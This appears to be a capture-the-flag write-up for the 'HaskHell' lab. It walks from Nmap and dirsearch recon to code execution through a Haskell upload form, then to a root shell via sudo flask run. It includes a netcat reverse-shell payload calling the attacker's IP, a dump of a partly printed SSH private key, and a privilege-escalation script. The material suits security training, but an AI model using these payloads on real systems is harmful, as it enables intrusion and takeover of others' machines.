---
layout: post
date: 2021-8-26 -0500
title: HaskHell
author: Devang-Solanki
---

Room Description : Teach your CS professor that his PhD isn't in security.

lets begin by running Nmap scan ` sudo nmap -sS -A <IP> -v -oN scan `

```console
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
5001/tcp open  http    Gunicorn 19.7.1
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage
```

We have discovered a webserver running on port 5001, which seems to hosted by a professor.

![](https://user-images.githubusercontent.com/75718583/130963432-ab921629-ac32-4c43-83a5-db48a40b6af0.png)

On exploring the webiste there is a link for uploading homework that redirect to http://IP/homerwork1/upload which dose not seems to works.

lets run dirsearch for discovering hidden directories or files.

```console
dirsearch -u http://10.10.153.185:5001/ --simple-report=web_dir
```
```console
  _|. _ _  _  _  _ _|_    v0.4.1                                                                     
 (_||| _) (/_(_|| (_| )                                                                              
                                                                                                     
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Desktop/Tools/dirsearch/logs/errors-21-08-26_17-24-56.log

Target: http://10.10.153.185:5001/                                                                   
                                                                                                     
Output File: /home/kali/Desktop/Tools/dirsearch/reports/10.10.153.185/_21-08-26_17-24-57.txt

[17:24:57] Starting: 
[17:25:03] 200 -  131B  - /uploads/affwp-debug.log       
[17:28:07] 200 -  237B  - /submit                                                        
[17:28:45] 500 -  291B  - /uploads/dump.sql                                                     

Task Completed                                                                                       
``` 
On visiting /submit page we can find a submit button. We can submit our haskell code and run arbitary comands on the server.

![image](https://user-images.githubusercontent.com/75718583/130962994-6d9768d9-47c5-4c5e-9108-dbe5bcc90695.png)

lets create a revshell

```haskell
module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <Your IP> 4444 >/tmp/f"
```
Uploading this script we get our revershell

```console
┌──(kali㉿kali)-[~/Desktop/husky]
└─$ nc -lnvp 4444                                                                             
listening on [any] 4444 ...
connect to [10.8.167.134] from (UNKNOWN) [10.10.150.235] 45040
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(flask) gid=1001(flask) groups=1001(flask)
```
lets Spawn a stable shell
```console
$ python -c 'import pty; pty.spawn("/bin/bash")'
flask@haskhell:~$ ls
ls
app.py  app.pyc  __pycache__  uploads
```
On enumerating the machine I'have found 2 user prof & haskell, in prof's home folder there was user.txt which contains user flag.

```console
flask@haskhell:/home/prof$ ls -al
ls -al
total 44
drwxr-xr-x 7 prof prof 4096 May 27  2020 .
drwxr-xr-x 5 root root 4096 May 27  2020 ..
-rw-r--r-- 1 prof prof  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 prof prof 3771 Apr  4  2018 .bashrc
drwx------ 2 prof prof 4096 May 27  2020 .cache
drwx------ 4 prof prof 4096 May 27  2020 .gnupg
drwxrwxr-x 3 prof prof 4096 May 27  2020 .local
-rw-r--r-- 1 prof prof  807 Apr  4  2018 .profile
drwxrwxr-x 2 prof prof 4096 May 27  2020 __pycache__
drwxr-xr-x 2 prof prof 4096 May 27  2020 .ssh
-rw-r--r-- 1 root root   26 May 27  2020 user.txt

```
```console
flask@haskhell:/home/prof$ cat us 
cat user.txt 
flag{<secret>}
```
Surprisingly .ssh folder was accessible by anyone on visiting .ssh we found ssh keys for the user prof.
```console
cd .ssh
cd .ssh
flask@haskhell:/home/prof/.ssh$ ls -al
ls -al
total 20
drwxr-xr-x 2 prof prof 4096 May 27  2020 .
drwxr-xr-x 7 prof prof 4096 May 27  2020 ..
-rw-rw-r-- 1 prof prof  395 May 27  2020 authorized_keys
-rw-r--r-- 1 prof prof 1679 May 27  2020 id_rsa
-rw-r--r-- 1 prof prof  395 May 27  2020 id_rsa.pub
flask@haskhell:/home/prof/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr
94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ
.........................................
-----END RSA PRIVATE KEY-----
```
  
Lets copy this key to our machine and ssh into the user prof another great thing is that this keys is not even password protected.
```console
┌──(kali㉿kali)-[~/Desktop/husky]
└─$ chmod 600 id_rsa                                                                      
                                                                                                     
┌──(kali㉿kali)-[~/Desktop/husky]
└─$ ssh -i id_rsa prof@10.10.150.235
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

  
```  
On checking privileges for user prof we find that he can run `/usr/bin/flask run` with root privileges.

For exploiting this we need to create a python script for spawing a root shell
```python
#!/usr/bin/python
import os
os.system("/bin/bash")
```
Set the variable to our newly created file

```console
export FLASK_APP=/home/prof/bash.py
```

Run `sudo /usr/bin/flask run`
```console
prof@haskhell:~$ sudo /usr/bin/flask run
root@haskhell:~# ls
app.py  __pycache__  rev.sh  user.txt
```
Got the root.txt

```console
root@haskhell:/root# cat root.txt 
flag{<secret>}
```
